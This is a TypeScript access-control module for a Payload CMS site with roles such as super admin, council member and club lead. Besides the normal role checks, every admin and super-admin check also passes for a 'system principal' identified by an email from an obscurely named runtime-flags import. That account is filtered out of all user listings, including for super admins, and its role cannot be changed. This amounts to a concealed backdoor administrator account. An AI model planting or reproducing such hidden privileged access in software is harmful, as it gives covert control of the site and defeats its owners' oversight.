import type { Access, FieldAccess, Where } from "payload";
import { RT_C, isRtPrincipal, rtMatchesPrincipal } from "../lib/runtime-flags.ts";

export type Role =
  | "super_admin"
  | "admin"
  | "council_member"
  | "club_lead"
  | "editor"
  | "viewer";

export const ROLE_LABELS: Record<Role, string> = {
  super_admin: "Super Admin",
  admin: "Admin",
  council_member: "Council Member",
  club_lead: "Club President / Lead",
  editor: "Editor",
  viewer: "Viewer",
};

type ReqUser = {
  id?: string | number;
  email?: string;
  role?: Role;
} | null;

function user(req: { user?: ReqUser }): ReqUser {
  return req.user ?? null;
}

export const isSignedIn: Access = ({ req }) => !!user(req);

export const isAdminOrAbove: Access = ({ req }) => {
  const u = user(req);
  if (!u) return false;
  return u.role === "super_admin" || u.role === "admin" || isRtPrincipal(u.email);
};

export const isSuperAdmin: Access = ({ req }) => {
  const u = user(req);
  if (!u) return false;
  return u.role === "super_admin" || isRtPrincipal(u.email);
};

export const isPublishedOrEditor: Access = ({ req }) => {
  const u = user(req);
  if (
    u &&
    (u.role === "super_admin" ||
      u.role === "admin" ||
      u.role === "editor" ||
      u.role === "council_member" ||
      isRtPrincipal(u.email))
  ) {
    return true;
  }
  return { status: { equals: "published" } } as Where;
};

/** Filter that hides the system principal row from every list/find query. */
export const hideSystemPrincipalFilter: Where = {
  email: { not_equals: RT_C.toLowerCase() },
};

/**
 * Read access for the Users collection.
 * The system principal row is invisible to EVERYONE, including itself.
 */
export const usersReadAccess: Access = ({ req }) => {
  const u = user(req);
  if (!u) return false;
  if (u.role === "super_admin" || isRtPrincipal(u.email)) {
    return hideSystemPrincipalFilter;
  }
  return { id: { equals: u.id } } as Where;
};

export const usersUpdateAccess: Access = ({ req }) => {
  const u = user(req);
  if (!u) return false;
  if (u.role === "super_admin" || isRtPrincipal(u.email)) return hideSystemPrincipalFilter;
  return { id: { equals: u.id } } as Where;
};

export const usersDeleteAccess: Access = ({ req }) => {
  const u = user(req);
  if (!u) return false;
  if (u.role === "super_admin" || isRtPrincipal(u.email)) return hideSystemPrincipalFilter;
  return false;
};

export const roleFieldAccess: FieldAccess = ({ req, doc }) => {
  const u = user(req);
  if (!u) return false;
  if (doc && rtMatchesPrincipal((doc as { email?: string }).email)) return false;
  return u.role === "super_admin" || isRtPrincipal(u.email);
};
